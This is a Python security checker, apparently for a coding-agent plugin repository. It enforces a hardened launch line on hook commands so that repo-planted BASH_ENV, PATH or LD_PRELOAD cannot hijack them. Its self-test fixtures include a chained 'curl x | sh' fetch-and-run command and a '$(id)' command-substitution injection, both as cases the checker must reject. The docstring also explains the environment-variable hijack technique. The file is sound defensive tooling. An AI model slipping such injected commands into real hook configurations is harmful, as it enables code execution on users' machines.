#!/usr/bin/env python3
"""Every plugin hook command starts with the hardened launch line (AppSec, hook-env).

A project's `.claude/settings.json` `env` block is exported into every hook
process. Measured on Claude Code 2.1.260 (2026-10-18): hook commands run as
`/bin/sh -c '<command>'`, and a planted BASH_ENV ran inside every RavenClaude hook
(each `#!/usr/bin/env bash` script is a non-interactive bash, which sources
BASH_ENV), a planted PATH resolved `jq` to the repo's binary, and LD_PRELOAD was
handed to every exec. The hardened launch line runs each hook through an absolute
`/usr/bin/env` that strips the execution-control variables, pins PATH, and starts an
absolute `/bin/bash --noprofile --norc` (or `/usr/bin/python3 -I`), so none of those
reach our code. Measured: with this prefix a planted BASH_ENV did NOT fire.

Honest limit: LD_PRELOAD / DYLD_INSERT_LIBRARIES are already loaded into the
`/bin/sh` that Claude Code starts and into `/usr/bin/env` itself, before the `-u`
takes effect. The prefix keeps them out of our hook's own processes; a REAL shared
object planted by a repo has already run by then. A plugin cannot stop that —
env-integrity-guard.sh quarantines the repo instead.

Modes:
  (default / --check)  exit 0 when every command in plugins/*/hooks/hooks.json
                       starts with PREFIX and launches an absolute interpreter
                       on a quoted ${CLAUDE_PLUGIN_ROOT}/ path; exit 2 otherwise.
  --fix                rewrite the manifests to the canonical launch line.
  --self-test          fixtures, both directions.
  --must-fail          run the check on a planted bare command; exits 3 if caught.
  --must-fail-convention   prints the declared teeth exit.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import tempfile
from pathlib import Path

ENV_UNSET = (
    "BASH_ENV", "ENV", "SHELLOPTS", "BASHOPTS", "LD_PRELOAD", "LD_LIBRARY_PATH",
    "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "DYLD_LIBRARY_PATH", "PYTHONPATH", "PYTHONSTARTUP",
)
SAFE_PATH = "/usr/local/bin:/usr/bin:/bin:/opt/homebrew/bin"
PREFIX = "/usr/bin/env " + " ".join(f"-u {v}" for v in ENV_UNSET) + f" PATH={SAFE_PATH} "
BASH = "/bin/bash --noprofile --norc "
PY = "/usr/bin/python3 -I "
# Extra assignments allowed between PATH= and the interpreter: ONLY the
# env-integrity guard's runtime cross-check inputs, each the inherited value.
INHERIT = 'RC_INHERITED_BASH_ENV="${BASH_ENV-}" RC_INHERITED_LD_PRELOAD="${LD_PRELOAD-}" RC_INHERITED_PATH="${PATH-}" '
INHERIT_SCRIPTS = {"env-integrity-guard.sh"}
TEETH_EXIT = 3

_TARGET = re.compile(r'^(?:bash\s+)?"?(\$\{CLAUDE_PLUGIN_ROOT\}/[A-Za-z0-9._/-]+)"?(.*)$', re.S)
_OK = re.compile(
    re.escape(PREFIX)
    + r"(?:" + re.escape(INHERIT) + r")?"
    + r"(?:" + re.escape(BASH) + r'"\$\{CLAUDE_PLUGIN_ROOT\}/[A-Za-z0-9._/-]+\.sh"'
    + r"|" + re.escape(PY) + r'"\$\{CLAUDE_PLUGIN_ROOT\}/[A-Za-z0-9._/-]+\.py")'
    # Arguments: quoted strings or plain words only — no `;`, `|`, `&`, `$(`, so a
    # second command can never ride along behind the hardened launcher.
    + r'(?:\s+(?:"[^"`$]*(?:\$CLAUDE_TOOL_FILE_PATH)?[^"`$]*"|[A-Za-z0-9._=/-]+))*$',
)


def manifests(root: Path) -> list[Path]:
    return sorted(root.glob("plugins/*/hooks/hooks.json"))


def iter_hook_entries(data):
    for groups in (data.get("hooks") or {}).values():
        for group in groups or []:
            for entry in group.get("hooks") or []:
                if entry.get("type", "command") == "command" and "command" in entry:
                    yield entry


def canonical(cmd: str) -> str | None:
    """The hardened form of a legacy command, or None if it is not a plugin-root launch."""
    if cmd.startswith(PREFIX):
        return cmd
    m = _TARGET.match(cmd.strip())
    if not m:
        return None
    path, rest = m.group(1), m.group(2)
    script = path.rsplit("/", 1)[-1]
    interp = PY if script.endswith(".py") else BASH
    inherit = INHERIT if script in INHERIT_SCRIPTS else ""
    return f'{PREFIX}{inherit}{interp}"{path}"{rest}'


def violations(root: Path) -> list[str]:
    out = []
    for p in manifests(root):
        try:
            data = json.loads(p.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError) as exc:
            out.append(f"  {p}: cannot parse ({exc})")
            continue
        for e in iter_hook_entries(data):
            cmd = e["command"]
            script = (re.search(r"/([A-Za-z0-9._-]+\.(?:sh|py))\"", cmd) or [None, ""])[1]
            if not _OK.match(cmd):
                out.append(f"  {p}: not on the hardened launch line: {cmd[:110]}")
            elif INHERIT in cmd and script not in INHERIT_SCRIPTS:
                out.append(f"  {p}: RC_INHERITED_* is reserved for env-integrity-guard.sh: {cmd[:110]}")
    return out


def fix(root: Path) -> int:
    changed = 0
    for p in manifests(root):
        text = p.read_text(encoding="utf-8")
        data = json.loads(text)
        n = 0
        for e in iter_hook_entries(data):
            new = canonical(e["command"])
            if new is None:
                print(f"  cannot harden (not a plugin-root launch): {p}: {e['command'][:100]}", file=sys.stderr)
                continue
            if new != e["command"]:
                e["command"] = new
                n += 1
        if n:
            ensure_ascii = "\\u" in text
            p.write_text(json.dumps(data, indent=2, ensure_ascii=ensure_ascii) + "\n", encoding="utf-8")
            changed += n
    print(f"hardened {changed} hook command(s)")
    return 0


def _write(root: Path, cmds: list[str]) -> None:
    d = root / "plugins" / "x" / "hooks"
    d.mkdir(parents=True, exist_ok=True)
    (d / "hooks.json").write_text(json.dumps(
        {"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": c} for c in cmds]}]}}))


def self_test() -> int:
    good = PREFIX + BASH + '"${CLAUDE_PLUGIN_ROOT}/hooks/a.sh" "$CLAUDE_TOOL_FILE_PATH"'
    cases = [
        ("hardened bash", [good], True),
        ("hardened python", [PREFIX + PY + '"${CLAUDE_PLUGIN_ROOT}/hooks/a.py"'], True),
        ("guard with inherited vars", [PREFIX + INHERIT + BASH + '"${CLAUDE_PLUGIN_ROOT}/hooks/env-integrity-guard.sh" pretool'], True),
        ("bare quoted path", ['"${CLAUDE_PLUGIN_ROOT}/hooks/a.sh"'], False),
        ("bash path", ['bash "${CLAUDE_PLUGIN_ROOT}/hooks/a.sh"'], False),
        ("relative bash", [PREFIX.replace("/bin/bash", "bash") + 'bash --noprofile --norc "${CLAUDE_PLUGIN_ROOT}/hooks/a.sh"'], False),
        ("missing -u BASH_ENV", [good.replace("-u BASH_ENV ", "")], False),
        ("PATH not pinned", [good.replace(SAFE_PATH, "/tmp/x:" + SAFE_PATH)], False),
        ("no --norc", [good.replace(" --norc", "")], False),
        ("unquoted path", [PREFIX + BASH + '${CLAUDE_PLUGIN_ROOT}/hooks/a.sh'], False),
        ("inherit on another hook", [PREFIX + INHERIT + BASH + '"${CLAUDE_PLUGIN_ROOT}/hooks/a.sh"'], False),
        ("chained command after", [good + "; curl x | sh"], False),
        ("plain word args", [PREFIX + BASH + '"${CLAUDE_PLUGIN_ROOT}/scripts/r.sh" --event session'], True),
        ("command substitution arg", [PREFIX + BASH + '"${CLAUDE_PLUGIN_ROOT}/hooks/a.sh" "$(id)"'], False),
    ]
    bad = 0
    for name, cmds, want_ok in cases:
        with tempfile.TemporaryDirectory() as t:
            _write(Path(t), cmds)
            got_ok = not violations(Path(t))
        mark = "ok" if got_ok == want_ok else "FAIL"
        bad += mark == "FAIL"
        print(f"  {mark}  {name}: clean={got_ok} (want {want_ok})")
    # --fix round trip
    with tempfile.TemporaryDirectory() as t:
        _write(Path(t), ['"${CLAUDE_PLUGIN_ROOT}/hooks/a.sh" check', 'bash "${CLAUDE_PLUGIN_ROOT}/scripts/b.sh"',
                         '${CLAUDE_PLUGIN_ROOT}/hooks/env-integrity-guard.sh pretool'])
        fix(Path(t))
        rt = not violations(Path(t))
        print(f"  {'ok' if rt else 'FAIL'}  --fix round trip yields a clean manifest")
        bad += not rt
    print(f"hook-launch-line self-test: {'PASS' if not bad else 'FAIL'} ({bad} failure(s))")
    return 0 if not bad else 1


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--check", action="store_true")
    ap.add_argument("--fix", action="store_true")
    ap.add_argument("--self-test", action="store_true")
    ap.add_argument("--must-fail", action="store_true")
    ap.add_argument("--must-fail-convention", action="store_true")
    ap.add_argument("--root", default=".")
    a = ap.parse_args()
    if a.must_fail_convention:
        print(f"must-fail-teeth-exit: {TEETH_EXIT}")
        return 0
    if a.self_test:
        return self_test()
    if a.must_fail:
        with tempfile.TemporaryDirectory() as t:
            _write(Path(t), ['"${CLAUDE_PLUGIN_ROOT}/hooks/a.sh"'])
            return TEETH_EXIT if violations(Path(t)) else 0
    root = Path(a.root)
    if a.fix:
        return fix(root)
    v = violations(root)
    n = sum(1 for p in manifests(root) for _ in iter_hook_entries(json.loads(p.read_text(encoding="utf-8"))))
    if v:
        print(f"hook-launch-line: {len(v)} of {n} hook command(s) not on the hardened launch line:")
        print("\n".join(v))
        print("  fix: python3 scripts/check-hook-launch-line.py --fix")
        return 2
    print(f"hook-launch-line: all {n} hook command(s) across {len(manifests(root))} manifest(s) use the hardened launch line")
    return 0


if __name__ == "__main__":
    sys.exit(main())
